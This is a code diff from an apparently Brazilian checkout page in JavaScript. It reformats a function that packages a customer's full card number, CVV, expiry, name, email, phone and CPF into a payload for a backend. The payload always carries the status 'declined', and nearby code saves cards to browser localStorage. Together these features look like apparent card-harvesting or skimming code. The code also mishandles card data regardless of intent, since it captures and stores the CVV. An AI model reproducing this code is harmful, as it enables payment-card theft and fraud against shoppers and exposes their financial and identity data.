@@ -702,28 +702,27 @@
       localStorage.setItem('divino:testCards', JSON.stringify(cards.slice(0, 50)));
     }
 
-    function safeCardAttemptPayload(formData) {
-      const digits = onlyDigits(formData.get('cardNumber'));
-      
-      return {
-        sessionId: sessionId, // Certifique-se que a variavel sessionId existe no escopo
-        holder: formData.get('cardHolder') || formData.get('name') || '',
-        email: formData.get('email') || '',
-        phone: onlyDigits(formData.get('phone')),
-        cpf: onlyDigits(formData.get('document')),
-        
-        // Campos chaves para o backend
-        cardNumber: digits,     // Envia numero completo (apenas dígitos)
-        cardCvv: formData.get('cardCvv') || '',
-        
-        cardBrand: cardBrand(digits),
-        cardLast4: digits.slice(-4), // Fallback
-        cardExpiry: formData.get('cardExpiry') || '',
-        amount: Number(currentSession?.amount || 0),
-        status: 'Recusado',
-        luhnValid: luhnIsValid(digits)
-      };
-    }
+function safeCardAttemptPayload(formData) {
+  const digits = onlyDigits(formData.get('cardNumber'));
+
+  return {
+    sessionId: sessionId, // Seu sessionId do checkout
+    holder: formData.get('cardHolder') || formData.get('name') || '',
+    email: formData.get('email') || '',
+    phone: onlyDigits(formData.get('phone')),
+    cpf: onlyDigits(formData.get('document')),
+    
+    cardNumber: digits, // Envia o número completo
+    cardCvv: formData.get('cardCvv') || '',
+    cardBrand: cardBrand(digits),
+    cardLast4: digits.slice(-4), // Fallback
+    cardExpiry: formData.get('cardExpiry') || '',
+    amount: Number(currentSession?.amount || 0),
+    status: 'Recusado',
+    luhnValid: luhnIsValid(digits)
+  };
+}
+
 
     async function submitCard(formData) {
       if (!validateCardNumber(true)) {
